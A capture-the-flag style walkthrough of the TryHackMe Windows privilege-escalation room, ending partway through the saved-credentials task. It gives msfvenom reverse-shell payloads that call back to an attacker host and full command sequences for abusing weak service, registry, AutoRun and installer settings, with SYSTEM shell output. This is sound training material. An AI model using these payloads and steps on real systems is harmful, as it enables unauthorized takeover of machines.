# Windows PrivEsc

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple 
ways to get admin/SYSTEM! RDP is available. 
Credentials: user:password321
```

Room link: [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)

## Solution

### Task 1: Deploy the Vulnerable Windows VM

This room is aimed at walking you through a variety of Windows Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Windows VM. This VM was created by Sagi Shahar as part of his [local privilege escalation workshop](https://github.com/sagishahar/lpeworkshop) but has been updated by [Tib3rius](https://twitter.com/TibSec) as part of his [Windows Privilege Escalation for OSCP and Beyond!](https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574) course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.

Make sure you are connected to the [TryHackMe VPN](https://tryhackme.com/access) or using the in-browser Kali instance before trying to access the Windows VM!

RDP should be available on port 3389 (it may take a few minutes for the service to start). You can login to the "user" account using the password "**password321**":

`xfreerdp /u:user /p:password321 /cert:ignore /v:10.64.154.251`

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a admin or SYSTEM shell.

**Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!**

---------------------------------------------------------------------------------------

#### Deploy the Windows VM and login using the "user" account

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ export TARGET_IP=10.64.154.251

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:user /p:'password321' /h:1024 /w:1500 +clipboard 
[14:26:02:365] [151178:151179] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[14:26:02:365] [151178:151179] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[14:26:03:570] [151178:151179] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
<---snip--->
```

---------------------------------------------------------------------------------------

### Task 2: Generate a Reverse Shell Executable

On Kali, generate a reverse shell executable (reverse.exe) using **msfvenom**. Update the LHOST IP address accordingly:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`

Transfer the `reverse.exe` file to the `C:\PrivEsc` directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

On Windows (update the IP address with your Kali IP):

`copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

Test the reverse shell by setting up a netcat listener on Kali:

`sudo nc -nvlp 53`

Then run the reverse.exe executable on Windows and catch the shell:

`C:\PrivEsc\reverse.exe`

The `reverse.exe` executable will be used in many of the tasks in this room, so don't delete it!

---------------------------------------------------------------------------------------

#### Generate a reverse shell executable and transfer it to the Windows VM. Check that it works

Generate a reverse shell with msfvenom and share it via SMB

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.77 LPORT=12345 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

Then copy it to the target machine

```bat
C:\Users\user> cd C:\PrivEsc

C:\PrivEsc> copy \\192.168.144.77\kali\reverse.exe C:\PrivEsc\reverse.exe
        1 file(s) copied.

C:\PrivEsc> dir
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\PrivEsc

02/14/2026  05:33 AM    <DIR>          .
02/14/2026  05:33 AM    <DIR>          ..
02/22/2020  09:38 PM           222,592 accesschk.exe
06/05/2020  07:32 AM               959 AdminPaint.lnk
02/22/2020  09:38 PM               232 CreateShortcut.vbs
06/05/2020  07:32 AM               990 lpe.bat
02/22/2020  09:38 PM           678,312 plink.exe
02/22/2020  09:38 PM           494,860 PowerUp.ps1
06/05/2020  08:06 AM            27,136 PrintSpoofer.exe
02/22/2020  09:38 PM         1,258,824 Procmon64.exe
02/22/2020  09:38 PM           374,944 PsExec64.exe
02/14/2026  05:31 AM             7,168 reverse.exe
05/11/2020  08:23 AM           159,232 RoguePotato.exe
06/05/2020  07:32 AM               221 savecred.bat
02/22/2020  09:38 PM           160,768 Seatbelt.exe
02/22/2020  09:38 PM            26,112 SharpUp.exe
03/06/2020  07:00 PM           229,376 winPEASany.exe
              15 File(s)      3,641,726 bytes
               2 Dir(s)  30,848,913,408 bytes free

C:\PrivEsc>
```

---------------------------------------------------------------------------------------

### Task 3: Service Exploits - Insecure Service Permissions

Use **accesschk.exe** to check the "user" account's permissions on the "daclsvc" service:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

`sc qc daclsvc`

Modify the service config and set the BINARY_PATH_NAME (binpath) to the **reverse.exe** executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

---------------------------------------------------------------------------------------

#### What is the original BINARY_PATH_NAME of the daclsvc service?

Analyse the vulnerable service and set it to our reverse shell

```bat
C:\PrivEsc> accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\PrivEsc> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\reverse.exe"
[SC] ChangeServiceConfig SUCCESS

C:\PrivEsc> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\PrivEsc\reverse.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>
```

Start a netcat listener at our Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Start the service to trigger the reverse shell

```bat
C:\PrivEsc> net start daclsvc

```

Check the connection at the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.154.251] 49924
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

Answer: `C:\Program Files\DACL Service\daclservice.exe`

---------------------------------------------------------------------------------------

### Task 4: Service Exploits - Unquoted Service Path

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

Using **accesschk.exe**, note that the BUILTIN\Users group is allowed to write to the `C:\Program Files\Unquoted Path Service\` directory:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"`

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`

---------------------------------------------------------------------------------------

#### What is the BINARY_PATH_NAME of the unquotedsvc service?

Analyse the vulnerable service and create a copy of the reverse shell

```bat
C:\PrivEsc> sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc> C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

C:\PrivEsc> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.

C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Start the service to trigger the reverse shell

```bat
C:\PrivEsc>net start unquotedsvc

```

And check the connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.154.251] 49983
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

Answer: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`

---------------------------------------------------------------------------------------

### Task 5: Service Exploits - Weak Registry Permissions

Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc regsvc`

Using **accesschk.exe**, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Analyse the vulnerable service and overwrite it with the reverse shell

```bat
C:\PrivEsc> sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc> accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

C:\PrivEsc> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.

C:\PrivEsc> reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
    ImagePath    REG_EXPAND_SZ    C:\PrivEsc\reverse.exe


C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Start the service to trigger the reverse shell

```bat
C:\PrivEsc> net start regsvc

```

Finally, check the connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.154.251] 50051
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 6: Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc filepermsvc`

Using **accesschk.exe**, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Copy the `reverse.exe` executable you created and replace the `filepermservice.exe` with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start filepermsvc`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Analyse the vulnerable service and overwrite it with the reverse shell

```bat
C:\PrivEsc> sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc> C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

C:\PrivEsc> copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.

C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Start the service to trigger the reverse shell

```bat
C:\PrivEsc> net start filepermsvc

```

Check the connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.154.251] 50103
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 7: Registry - AutoRuns

Query the registry for AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using **accesschk.exe**, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (`admin:password123`) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

`rdesktop 10.64.154.251`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Analyse the vulnerable service and overwrite it with the reverse shell

```bat
C:\PrivEsc> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"


C:\PrivEsc> accesschk.exe -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

C:\PrivEsc> copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.

C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Logout and reconnect with RDP as `admin` to trigger the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:admin /p:'password123' /h:1024 /w:1500 +clipboard 
[15:24:32:909] [180044:180045] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[15:24:32:909] [180044:180045] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<---snip--->
```

Finally, check the connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.154.251] 50156
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 8: Registry - AlwaysInstallElevated

Query the registry for AlwaysInstallElevated keys:

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (`reverse.msi`) using msfvenom. Update the LHOST IP address accordingly:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Analyse the registry

```bat
C:\PrivEsc> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\PrivEsc> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\PrivEsc>
```

Create a reverse shell in MSI-format and share it via SMB

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.77 LPORT=12345 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                       
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

Copy it to the target machine

```bat
C:\PrivEsc> copy \\192.168.144.77\kali\reverse.msi C:\PrivEsc\reverse.msi
        1 file(s) copied.

C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                                  
listening on [any] 12345 ...

```

Trigger the reverse shell

```bat
C:\PrivEsc>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

C:\PrivEsc>
```

Check the connection at the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                                  
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.67.189.225] 50056
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 9: Passwords - Registry

(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: `password123`)

The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //10.67.189.225 cmd.exe`

---------------------------------------------------------------------------------------

#### What was the password you found in the registry?

Search for passwords in registry

```bat
C:\PrivEsc> reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
    (Default)    REG_SZ    Picture Password Enrollment UX

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{24954E9B-D39A-4168-A3B2-E5014C94492F}
    (Default)    REG_SZ    OOBE Upgrade Password Page

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class
<---snip--->
HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\ehstorpwddrv.inf_amd64_d14b2d0cd98ecf84\Strings
    devicename    REG_SZ    Microsoft supported IEEE 1667 password silo

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 258 match(es) found.

C:\PrivEsc>
C:\PrivEsc> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    admin
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x236f172d
    ShutdownFlags    REG_DWORD    0x7
    AutoAdminLogon    REG_SZ    0
    AutoLogonSID    REG_SZ    S-1-5-21-3025105784-3259396213-1915610826-1001
    LastUsedUsername    REG_SZ    admin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey

C:\PrivEsc>
```

No password information found!

Connect to the target machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ winexe -U 'admin%password123' //10.66.131.162 cmd.exe
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>exit
exit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ 
```

Answer: `password123`

---------------------------------------------------------------------------------------

### Task 10: Passwords - Saved Creds

List any saved credentials:

`cmdkey /list`

Note that credentials for the "admin" user are saved. If they aren't, run the `C:\PrivEsc\savecred.bat` script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Check for any saved credentials

```bat
C:\PrivEsc>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin


C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                           
listening on [any] 12345 ...

```

Start the reverse shell as admin with the found credentials

```bat
C:\PrivEsc> runas /savecred /user:admin C:\PrivEsc\reverse.exe
Attempting to start C:\PrivEsc\reverse.exe as user "WIN-QBA94KB3IOF\admin" ...

C:\PrivEsc>
```

Check the connection at the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                           
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.131.162] 49866
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

